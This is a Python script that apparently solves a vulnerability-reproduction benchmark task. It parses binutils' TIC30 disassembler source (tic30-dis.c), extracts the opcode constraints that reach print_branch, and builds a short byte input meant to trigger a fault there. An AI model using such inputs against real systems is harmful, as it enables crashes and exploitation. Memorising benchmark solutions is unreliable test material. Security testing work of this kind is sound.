import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _mask_c_strings(s: str) -> str:
    out = list(s)
    i = 0
    n = len(out)
    in_str = None
    while i < n:
        c = out[i]
        if in_str is None:
            if c == '"' or c == "'":
                in_str = c
                i += 1
                continue
            i += 1
            continue
        else:
            if c == "\\":
                if i + 1 < n:
                    out[i] = " "
                    out[i + 1] = " "
                    i += 2
                    continue
                out[i] = " "
                i += 1
                continue
            if c == in_str:
                in_str = None
                i += 1
                continue
            out[i] = " "
            i += 1
    return "".join(out)


def _match_pair(s: str, open_pos: int, open_ch: str, close_ch: str) -> int:
    depth = 0
    i = open_pos
    n = len(s)
    while i < n:
        ch = s[i]
        if ch == open_ch:
            depth += 1
        elif ch == close_ch:
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _extract_braced_block(s: str, brace_pos: int) -> Optional[str]:
    end = _match_pair(s, brace_pos, "{", "}")
    if end < 0:
        return None
    return s[brace_pos : end + 1]


def _find_function_block(src: str, func_name: str) -> Optional[str]:
    src_nc = _mask_c_strings(_strip_c_comments(src))
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\([^;]*?\)\s*\{", flags=re.S)
    m = pat.search(src_nc)
    if not m:
        return None
    brace_pos = src_nc.find("{", m.end() - 1)
    if brace_pos < 0:
        return None
    block_masked = _extract_braced_block(src_nc, brace_pos)
    if block_masked is None:
        return None
    real_block = src[m.start() : m.start() + (brace_pos - m.start())] + src[brace_pos : brace_pos + len(block_masked)]
    return real_block


_CAST_RE = re.compile(
    r"\(\s*(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:long\s+long|long|int|short|char|size_t|uintptr_t|uint32_t|uint64_t)\s*\)"
)


def _normalize_c_int_expr(expr: str) -> str:
    e = _strip_c_comments(expr).strip()
    e = _CAST_RE.sub("", e)
    e = re.sub(r"\b(0x[0-9a-fA-F]+)(?:[uUlL]+)\b", r"\1", e)
    e = re.sub(r"\b(\d+)(?:[uUlL]+)\b", r"\1", e)
    e = e.replace("&&", " and ").replace("||", " or ")
    e = re.sub(r"!\s*(?!=)", " not ", e)
    return e


def _safe_eval_int(expr: str, macros: Dict[str, int]) -> Optional[int]:
    e = _normalize_c_int_expr(expr)
    if not e:
        return None

    def repl(m: re.Match) -> str:
        name = m.group(0)
        if name in ("and", "or", "not"):
            return name
        if name in macros:
            return str(macros[name])
        return name

    e2 = re.sub(r"\b[A-Za-z_]\w*\b", repl, e)
    if re.search(r"\b[A-Za-z_]\w*\b", e2):
        return None

    if re.search(r"[^0-9a-fA-FxX\s\(\)\+\-\*/%<>&\^\|\~]", e2):
        return None

    try:
        val = eval(e2, {"__builtins__": None}, {})
        if isinstance(val, bool):
            val = int(val)
        if not isinstance(val, int):
            return None
        return val
    except Exception:
        return None


def _collect_macros(texts: List[str]) -> Dict[str, int]:
    raw: Dict[str, str] = {}
    for t in texts:
        for line in t.splitlines():
            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)(\s*\((.*?)\))?\s+(.*)$", line)
            if not m:
                continue
            name = m.group(1)
            if m.group(2) is not None:
                continue
            expr = m.group(4).strip()
            if not expr:
                continue
            if '"' in expr or "'" in expr:
                continue
            if any(k in expr for k in ("{", "}", ";")):
                continue
            raw[name] = expr

    resolved: Dict[str, int] = {}
    for _ in range(50):
        changed = False
        for name, expr in list(raw.items()):
            if name in resolved:
                continue
            v = _safe_eval_int(expr, resolved)
            if v is None:
                continue
            resolved[name] = int(v) & ((1 << 64) - 1)
            changed = True
        if not changed:
            break
    return resolved


def _parse_switch_expr(expr: str, macros: Dict[str, int], case_vals: List[int]) -> Optional[Tuple[int, int]]:
    e = _mask_c_strings(_strip_c_comments(expr)).strip()
    e = re.sub(r"\s+", "", e)

    m = re.match(r"^\(?([A-Za-z_]\w*)\)?&(.+)$", e)
    if m:
        mask = _safe_eval_int(m.group(2), macros)
        if mask is None:
            return None
        return int(mask) & 0xFFFFFFFF, 0

    m = re.match(r"^\(?\(?([A-Za-z_]\w*)>>(\d+)\)?\)?&(.+)$", e)
    if m:
        sh = int(m.group(2))
        mask = _safe_eval_int(m.group(3), macros)
        if mask is None:
            return None
        mask32 = (int(mask) & 0xFFFFFFFF) << sh
        mask32 &= 0xFFFFFFFF
        return mask32, sh

    m = re.match(r"^\(?([A-Za-z_]\w*)>>(\d+)\)?$", e)
    if m:
        sh = int(m.group(2))
        maxv = max(case_vals) if case_vals else 0xF
        bits = max(1, int(maxv).bit_length())
        bits = min(bits, 32 - sh)
        mask = ((1 << bits) - 1) << sh
        return mask & 0xFFFFFFFF, sh

    m = re.match(r"^\(?\(?([A-Za-z_]\w*)&(.+?)\)?\)?>>(\d+)$", e)
    if m:
        mask = _safe_eval_int(m.group(2), macros)
        if mask is None:
            return None
        sh = int(m.group(3))
        return int(mask) & 0xFFFFFFFF, sh

    return None


def _extract_switch_constraints(func_text: str, macros: Dict[str, int]) -> List[Tuple[int, int]]:
    t = _mask_c_strings(_strip_c_comments(func_text))
    constraints: List[Tuple[int, int]] = []

    idx = 0
    while True:
        sw = t.find("switch", idx)
        if sw < 0:
            break
        p = t.find("(", sw)
        if p < 0:
            idx = sw + 6
            continue
        pend = _match_pair(t, p, "(", ")")
        if pend < 0:
            idx = sw + 6
            continue
        expr = t[p + 1 : pend]

        b = t.find("{", pend)
        if b < 0:
            idx = pend + 1
            continue
        bend = _match_pair(t, b, "{", "}")
        if bend < 0:
            idx = b + 1
            continue

        body = t[b + 1 : bend]
        if "print_branch" not in body:
            idx = bend + 1
            continue

        case_iter = list(re.finditer(r"\bcase\s+([^:]+)\s*:", body))
        case_vals: List[int] = []
        for cm in case_iter:
            cv = _safe_eval_int(cm.group(1), macros)
            if cv is not None:
                case_vals.append(int(cv))

        parsed = _parse_switch_expr(expr, macros, case_vals)
        if not parsed:
            idx = bend + 1
            continue
        mask, sh = parsed

        call_iter = list(re.finditer(r"\bprint_branch\s*\(", body))
        case_pos = [(m.start(), m.group(1)) for m in case_iter]
        case_pos.sort()

        for callm in call_iter:
            callpos = callm.start()
            last_case_expr = None
            for cpos, cexpr in case_pos:
                if cpos < callpos:
                    last_case_expr = cexpr
                else:
                    break
            if last_case_expr is None:
                continue
            cval = _safe_eval_int(last_case_expr, macros)
            if cval is None:
                continue
            cval = int(cval)
            if sh == 0:
                val32 = cval & 0xFFFFFFFF
            else:
                if re.search(r"&", _normalize_c_int_expr(expr)) and ">>" in expr:
                    val32 = (cval & 0xFFFFFFFF) << sh
                elif ">>" in expr:
                    val32 = (cval & 0xFFFFFFFF) << sh
                else:
                    val32 = (cval << sh) & 0xFFFFFFFF
            val32 &= 0xFFFFFFFF
            constraints.append((mask & 0xFFFFFFFF, val32))
        idx = bend + 1

    return constraints


def _extract_if_constraints(src: str, macros: Dict[str, int]) -> List[Tuple[int, int]]:
    t = _mask_c_strings(_strip_c_comments(src))
    constraints: List[Tuple[int, int]] = []
    for m in re.finditer(r"\bif\s*\(", t):
        p = t.find("(", m.start())
        if p < 0:
            continue
        pend = _match_pair(t, p, "(", ")")
        if pend < 0:
            continue
        cond = t[p + 1 : pend]
        after = t[pend : min(len(t), pend + 400)]
        if "print_branch" not in after:
            continue

        c = _normalize_c_int_expr(cond)
        c = re.sub(r"\s+", "", c)

        m2 = re.match(r"^\(?\(?([A-Za-z_]\w*)&(.+?)\)?==(.+?)\)?$", c)
        if m2:
            mask = _safe_eval_int(m2.group(2), macros)
            val = _safe_eval_int(m2.group(3), macros)
            if mask is not None and val is not None:
                constraints.append((int(mask) & 0xFFFFFFFF, int(val) & 0xFFFFFFFF))
            continue

        m2 = re.match(r"^\(?\(?\(?([A-Za-z_]\w*)>>(\d+)\)?&(.+?)\)?==(.+?)\)?$", c)
        if m2:
            sh = int(m2.group(2))
            mask = _safe_eval_int(m2.group(3), macros)
            val = _safe_eval_int(m2.group(4), macros)
            if mask is not None and val is not None:
                mask32 = ((int(mask) & 0xFFFFFFFF) << sh) & 0xFFFFFFFF
                val32 = ((int(val) & 0xFFFFFFFF) << sh) & 0xFFFFFFFF
                constraints.append((mask32, val32))
            continue

        m2 = re.match(r"^\(?\(?\(?([A-Za-z_]\w*)&(.+?)\)?>>(\d+)\)?==(.+?)\)?$", c)
        if m2:
            mask = _safe_eval_int(m2.group(2), macros)
            sh = int(m2.group(3))
            val = _safe_eval_int(m2.group(4), macros)
            if mask is not None and val is not None:
                mask32 = int(mask) & 0xFFFFFFFF
                val32 = ((int(val) & 0xFFFFFFFF) << sh) & mask32
                constraints.append((mask32, val32))
            continue

    return constraints


def _detect_word_and_endian(src: str) -> Tuple[int, str]:
    s = _strip_c_comments(src)
    has_l32 = "bfd_getl32" in s or "getl32" in s
    has_b32 = "bfd_getb32" in s or "getb32" in s
    has_l16 = "bfd_getl16" in s or "getl16" in s
    has_b16 = "bfd_getb16" in s or "getb16" in s

    word_size = 4 if (has_l32 or has_b32) else (2 if (has_l16 or has_b16) else 4)

    if (has_l32 and not has_b32) or (has_l16 and not has_b16 and not has_l32 and not has_b32):
        endian = "little"
    elif (has_b32 and not has_l32) or (has_b16 and not has_l16 and not has_l32 and not has_b32):
        endian = "big"
    else:
        endian = "unknown"
    return word_size, endian


def _read_tar_or_dir_sources(src_path: str) -> Dict[str, str]:
    sources: Dict[str, str] = {}
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if not (fn.endswith(".c") or fn.endswith(".h")):
                    continue
                full = os.path.join(root, fn)
                try:
                    with open(full, "rb") as f:
                        b = f.read()
                    if len(b) > 3_000_000:
                        continue
                    sources[full] = b.decode("utf-8", errors="ignore")
                except Exception:
                    pass
        return sources

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not (name.endswith(".c") or name.endswith(".h")):
                    continue
                if m.size > 3_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    b = f.read()
                    sources[name] = b.decode("utf-8", errors="ignore")
                except Exception:
                    continue
    except Exception:
        pass
    return sources


def _choose_tic30_dis_source(sources: Dict[str, str]) -> Optional[str]:
    candidates = []
    for path, txt in sources.items():
        base = os.path.basename(path)
        if base == "tic30-dis.c" or path.endswith("/tic30-dis.c") or path.endswith("\\tic30-dis.c"):
            candidates.append((path, txt))
    if not candidates:
        for path, txt in sources.items():
            if "print_branch" in txt and "tic30" in path.lower() and path.lower().endswith(".c"):
                candidates.append((path, txt))
    if not candidates:
        for path, txt in sources.items():
            if "print_branch" in txt and path.lower().endswith(".c"):
                candidates.append((path, txt))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (0 if os.path.basename(x[0]) == "tic30-dis.c" else 1, len(x[1])))
    return candidates[0][1]


def _generate_payload_from_source(src: str, aux_texts: List[str]) -> bytes:
    macros = _collect_macros([src] + aux_texts)

    pb = _find_function_block(src, "print_branch")
    if pb is None:
        pb = ""

    word_size, endian = _detect_word_and_endian(src)

    constraints: List[Tuple[int, int]] = []
    try:
        constraints.extend(_extract_switch_constraints(src, macros))
    except Exception:
        pass
    try:
        constraints.extend(_extract_if_constraints(src, macros))
    except Exception:
        pass

    seen = set()
    uniq_constraints: List[Tuple[int, int]] = []
    for mask, val in constraints:
        mask &= 0xFFFFFFFF
        val &= 0xFFFFFFFF
        if mask == 0:
            continue
        if (val & mask) != val:
            continue
        key = (mask, val)
        if key in seen:
            continue
        seen.add(key)
        uniq_constraints.append(key)

    ops: List[int] = []
    for mask, val in uniq_constraints[:8]:
        base = val & 0xFFFFFFFF
        filled = (val | ((~mask) & 0xFFFFFFFF)) & 0xFFFFFFFF
        ops.append(base)
        ops.append(filled)

    if not ops:
        ops = [
            0xFFFFFFFF,
            0x00000000,
            0xF0000000,
            0x0F000000,
            0x80000000,
            0x7FFFFFFF,
            0xA5A5A5A5,
            0x5A5A5A5A,
        ]

    out = bytearray()

    def pack_word(x: int, end: str) -> bytes:
        if word_size == 2:
            return int(x & 0xFFFF).to_bytes(2, end, signed=False)
        return int(x & 0xFFFFFFFF).to_bytes(4, end, signed=False)

    if endian == "little":
        out += pack_word(ops[0], "little")
        out += pack_word(0, "little")
        out += pack_word(ops[1] if len(ops) > 1 else ops[0], "little")
    elif endian == "big":
        out += pack_word(ops[0], "big")
        out += pack_word(0, "big")
        out += pack_word(ops[1] if len(ops) > 1 else ops[0], "big")
    else:
        out += pack_word(ops[0], "little")
        out += pack_word(ops[0], "big")
        out += pack_word(0, "little")
        out += pack_word(0, "big")

    if len(out) < 10:
        out += b"\x00" * (10 - len(out))
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        sources = _read_tar_or_dir_sources(src_path)
        tic30_src = _choose_tic30_dis_source(sources)
        if tic30_src is None:
            return b"\xff" * 10

        aux = []
        for p, t in sources.items():
            lp = p.lower()
            bn = os.path.basename(p).lower()
            if "tic30" in lp or "c30" in lp or bn in ("tic30-opc.h", "tic30.h", "tic30-dis.h"):
                aux.append(t)
            if len(aux) >= 12:
                break

        try:
            return _generate_payload_from_source(tic30_src, aux)
        except Exception:
            return b"\xff" * 10